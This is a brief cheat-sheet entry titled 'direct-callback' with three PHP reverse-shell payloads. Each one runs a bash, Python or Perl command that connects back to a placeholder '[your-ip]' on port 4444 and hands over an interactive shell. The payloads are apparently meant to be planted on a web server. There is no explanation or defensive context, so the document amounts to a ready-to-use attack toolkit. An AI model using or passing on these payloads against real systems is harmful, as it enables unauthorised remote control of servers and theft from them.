# direct-callback

**Author:** Julien Bongars\
**Date:** 2026-02-07 02:24:11
**Path:**

---

## Direct callback

```php
<!-- bash -->
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[your-ip]/4444 0>&1'"); ?>

<!-- python -->
<?php
exec("python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"[your-ip]\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
?>

<!-- perl -->
<?php
exec("perl -e 'use Socket;$i=\"[your-ip]\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'");
?>
```
